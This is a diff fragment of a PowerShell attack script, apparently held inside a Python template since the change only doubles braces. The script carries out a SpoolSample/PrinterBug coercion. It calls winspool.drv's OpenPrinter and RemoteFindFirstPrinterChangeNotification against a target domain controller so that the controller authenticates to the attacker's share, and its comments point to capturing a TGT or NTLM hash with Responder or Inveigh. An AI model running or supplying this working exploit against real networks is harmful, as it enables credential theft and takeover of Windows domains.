@@ -163,7 +163,7 @@ try {{
     Add-Type @'
 using System;
 using System.Runtime.InteropServices;
-public class SpoolCoerce {
+public class SpoolCoerce {{
     [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
     public static extern bool OpenPrinter(string pPrinterName, out IntPtr phPrinter, IntPtr pDefault);
     [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
@@ -172,28 +172,28 @@ public class SpoolCoerce {
         IntPtr pPrinterNotifyOptions, IntPtr phChange);
     [DllImport("winspool.drv", SetLastError=true)]
     public static extern bool ClosePrinter(IntPtr hPrinter);
-}
+}}
 '@
     # Coerce DC to authenticate to our listener share (capture TGT/NTLM hash)
     $listenerPath = "\\\\$env:COMPUTERNAME\\share"
     $printerPath  = "\\\\$targetDC\\print\\$"
     $hPrinter = [IntPtr]::Zero
     $coerced = $false
-    try {
-        if ([SpoolCoerce]::OpenPrinter($printerPath, [ref]$hPrinter, [IntPtr]::Zero)) {
+    try {{
+        if ([SpoolCoerce]::OpenPrinter($printerPath, [ref]$hPrinter, [IntPtr]::Zero)) {{
             [SpoolCoerce]::RemoteFindFirstPrinterChangeNotification(
                 $hPrinter, 0x100, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
             [SpoolCoerce]::ClosePrinter($hPrinter) | Out-Null
             $coerced = $true
             $results += "[+] SpoolSample coercion sent to $targetDC — watch Responder/Inveigh for captured TGT"
-        } else {
+        }} else {{
             $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
             $results += "[-] OpenPrinter failed (err=$err) — Print Spooler may be disabled on $targetDC"
-        }
-    } catch {
+        }}
+    }} catch {{
         $results += "[-] SpoolSample RPC error: $($_.Exception.Message)"
-    }
-    $results += if ($coerced) { "[+] Coercion complete" } else { "[-] Coercion failed" }
+    }}
+    $results += if ($coerced) {{ "[+] Coercion complete" }} else {{ "[-] Coercion failed" }}
 
 }} catch {{
     $results += "[!] SpoolSample error: $_"
